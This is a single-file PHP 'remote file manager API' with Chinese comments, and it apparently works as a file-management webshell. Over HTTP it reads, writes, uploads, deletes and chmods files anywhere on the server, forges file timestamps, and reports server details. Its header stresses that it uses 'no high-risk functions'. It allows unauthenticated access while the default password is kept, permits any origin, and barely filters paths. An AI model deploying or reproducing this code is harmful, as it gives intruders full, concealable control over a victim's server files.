<?php
/**
 * 远程文件管理器 API
 * 单文件部署，无高危函数
 */

// ========== 配置 ==========
$PASSWORD = 'your_password_here';  // 修改为你的密码
// ==========================

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Password');

// 处理预检请求
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 响应函数
function response($success, $data = null, $message = '') {
    $result = array(
        'success' => $success,
        'data' => $data,
        'message' => $message
    );
    echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

// 获取操作类型
$action = isset($_GET['action']) ? $_GET['action'] : (isset($_POST['action']) ? $_POST['action'] : '');

// 如果没有提供action，返回API信息
if (empty($action)) {
    response(true, array(
        'name' => 'Remote File Manager API',
        'version' => '1.0',
        'status' => 'ready'
    ), 'API运行正常，请提供action参数');
}

// 验证密码
function checkPassword($password, $correctPassword) {
    if (empty($correctPassword) || $correctPassword === 'your_password_here') {
        return true; // 未设置密码时允许访问
    }
    return $password === $correctPassword;
}

// 获取密码
$password = isset($_SERVER['HTTP_X_PASSWORD']) ? $_SERVER['HTTP_X_PASSWORD'] :
            (isset($_POST['password']) ? $_POST['password'] :
            (isset($_GET['password']) ? $_GET['password'] : ''));

if (!checkPassword($password, $PASSWORD)) {
    http_response_code(401);
    response(false, null, '密码错误');
}

// 安全路径处理
function safePath($path) {
    $path = str_replace(['../', '..\\'], '', $path);
    if (empty($path)) return '/';
    $real = realpath($path);
    return $real ?: $path;
}

// 格式化文件大小
function formatSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

// 获取文件权限字符串
function getPermsString($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '??????????';

    $info = '';
    if (@is_link($path)) $info = 'l';
    elseif (@is_dir($path)) $info = 'd';
    else $info = '-';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');

    return $info;
}

switch ($action) {
    // 列出目录
    case 'list':
        $path = safePath($_GET['path'] ?? '/');

        if (!@is_dir($path)) {
            response(false, null, '目录不存在');
        }

        if (!@is_readable($path)) {
            response(false, null, '无权限读取');
        }

        $items = [];
        $files = @scandir($path);

        if ($files === false) {
            response(false, null, '无法读取目录');
        }

        foreach ($files as $file) {
            if ($file === '.') continue;

            $fullPath = rtrim($path, '/') . '/' . $file;
            $isDir = @is_dir($fullPath);

            $items[] = [
                'name' => $file,
                'path' => $fullPath,
                'is_dir' => $isDir,
                'size' => $isDir ? 0 : (@filesize($fullPath) ?: 0),
                'size_formatted' => $isDir ? '-' : formatSize(@filesize($fullPath) ?: 0),
                'mtime' => @filemtime($fullPath) ?: 0,
                'perms' => getPermsString($fullPath),
                'readable' => @is_readable($fullPath),
                'writable' => @is_writable($fullPath)
            ];
        }

        // 排序：目录在前
        usort($items, function($a, $b) {
            if ($a['name'] === '..') return -1;
            if ($b['name'] === '..') return 1;
            if ($a['is_dir'] && !$b['is_dir']) return -1;
            if (!$a['is_dir'] && $b['is_dir']) return 1;
            return strcasecmp($a['name'], $b['name']);
        });

        response(true, [
            'path' => $path,
            'items' => $items
        ]);
        break;

    // 读取文件
    case 'read':
        $path = safePath($_GET['path'] ?? '');

        if (!@is_file($path)) {
            response(false, null, '文件不存在');
        }

        if (!@is_readable($path)) {
            response(false, null, '无权限读取');
        }

        $content = @file_get_contents($path);
        if ($content === false) {
            response(false, null, '读取失败');
        }

        response(true, [
            'path' => $path,
            'content' => $content,
            'size' => strlen($content)
        ]);
        break;

    // 写入文件
    case 'write':
        $path = $_POST['path'] ?? '';
        $content = $_POST['content'] ?? '';

        if (empty($path)) {
            response(false, null, '路径不能为空');
        }

        $result = @file_put_contents($path, $content);
        if ($result === false) {
            response(false, null, '写入失败');
        }

        response(true, ['bytes' => $result], '保存成功');
        break;

    // 创建目录
    case 'mkdir':
        $path = $_POST['path'] ?? '';

        if (empty($path)) {
            response(false, null, '路径不能为空');
        }

        if (@file_exists($path)) {
            response(false, null, '目录已存在');
        }

        if (!@mkdir($path, 0755, true)) {
            response(false, null, '创建失败');
        }

        response(true, null, '创建成功');
        break;

    // 删除文件或目录
    case 'delete':
        $path = safePath($_POST['path'] ?? '');

        if (empty($path) || $path === '/') {
            response(false, null, '不能删除根目录');
        }

        if (!@file_exists($path)) {
            response(false, null, '文件不存在');
        }

        if (@is_dir($path)) {
            // 递归删除目录
            function deleteDir($dir) {
                $files = @scandir($dir);
                if ($files === false) return false;
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    $path = $dir . '/' . $file;
                    if (is_dir($path)) {
                        deleteDir($path);
                    } else {
                        @unlink($path);
                    }
                }
                return @rmdir($dir);
            }

            if (!deleteDir($path)) {
                response(false, null, '删除目录失败');
            }
        } else {
            if (!@unlink($path)) {
                response(false, null, '删除文件失败');
            }
        }

        response(true, null, '删除成功');
        break;

    // 重命名
    case 'rename':
        $oldPath = safePath($_POST['old_path'] ?? '');
        $newPath = $_POST['new_path'] ?? '';

        if (empty($oldPath) || empty($newPath)) {
            response(false, null, '路径不能为空');
        }

        if (!@file_exists($oldPath)) {
            response(false, null, '文件不存在');
        }

        if (@file_exists($newPath)) {
            response(false, null, '目标已存在');
        }

        if (!@rename($oldPath, $newPath)) {
            response(false, null, '重命名失败');
        }

        response(true, null, '重命名成功');
        break;

    // 上传文件
    case 'upload':
        $dir = safePath($_POST['dir'] ?? '/');

        if (!isset($_FILES['file'])) {
            response(false, null, '没有文件');
        }

        $file = $_FILES['file'];
        if ($file['error'] !== UPLOAD_ERR_OK) {
            response(false, null, '上传错误: ' . $file['error']);
        }

        $targetPath = rtrim($dir, '/') . '/' . basename($file['name']);

        if (!@move_uploaded_file($file['tmp_name'], $targetPath)) {
            response(false, null, '保存失败');
        }

        response(true, ['path' => $targetPath], '上传成功');
        break;

    // 下载文件
    case 'download':
        $path = safePath($_GET['path'] ?? '');

        if (!@is_file($path) || !@is_readable($path)) {
            http_response_code(404);
            exit('文件不存在');
        }

        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;

    // 修改时间
    case 'touch':
        $path = safePath($_POST['path'] ?? '');
        $time = $_POST['time'] ?? time();

        if (!@touch($path, (int)$time)) {
            response(false, null, '修改时间失败');
        }

        response(true, null, '修改成功');
        break;

    // 修改权限
    case 'chmod':
        $path = safePath($_POST['path'] ?? '');
        $mode = $_POST['mode'] ?? '';

        if (empty($mode)) {
            response(false, null, '权限不能为空');
        }

        if (!@chmod($path, octdec($mode))) {
            response(false, null, '修改权限失败');
        }

        response(true, null, '修改成功');
        break;

    // 获取文件信息
    case 'info':
        $path = safePath($_GET['path'] ?? '');

        if (!@file_exists($path)) {
            response(false, null, '文件不存在');
        }

        response(true, [
            'path' => $path,
            'name' => basename($path),
            'is_dir' => @is_dir($path),
            'size' => @filesize($path) ?: 0,
            'size_formatted' => formatSize(@filesize($path) ?: 0),
            'mtime' => @filemtime($path) ?: 0,
            'ctime' => @filectime($path) ?: 0,
            'atime' => @fileatime($path) ?: 0,
            'perms' => getPermsString($path),
            'perms_octal' => substr(sprintf('%o', @fileperms($path)), -4),
            'readable' => @is_readable($path),
            'writable' => @is_writable($path),
            'owner' => @fileowner($path),
            'group' => @filegroup($path)
        ]);
        break;

    // 服务器信息
    case 'server':
        response(true, [
            'php_version' => phpversion(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
            'script_path' => __FILE__,
            'upload_max' => ini_get('upload_max_filesize'),
            'post_max' => ini_get('post_max_size'),
            'disk_free' => formatSize(@disk_free_space('/') ?: 0),
            'disk_total' => formatSize(@disk_total_space('/') ?: 0)
        ]);
        break;

    default:
        response(false, null, '未知操作');
}
